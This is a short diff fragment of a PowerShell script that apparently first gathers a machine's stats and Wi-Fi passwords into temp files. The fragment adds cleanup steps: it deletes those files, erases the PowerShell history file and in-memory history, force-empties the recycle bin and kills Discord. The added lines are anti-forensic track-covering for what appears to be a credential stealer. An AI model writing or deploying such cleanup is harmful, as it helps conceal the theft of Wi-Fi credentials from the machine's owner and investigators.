@@ -61,3 +61,11 @@ cd $env:temp;
   Remove-Item "stats-$namepc.txt" -Force -Recurse;
 # Delete wifi password
   Remove-Item "WIFI-$namepc.txt" -Force -Recurse;
+# Delete powrshell history
+  Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue;
+# Clear History powershell:
+  [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
+# 1Empty recycle bin
+  Clear-RecycleBin -Force -ErrorAction SilentlyContinue;
+# Last discord kill before quit
+  taskkill /IM Discord.exe /F;
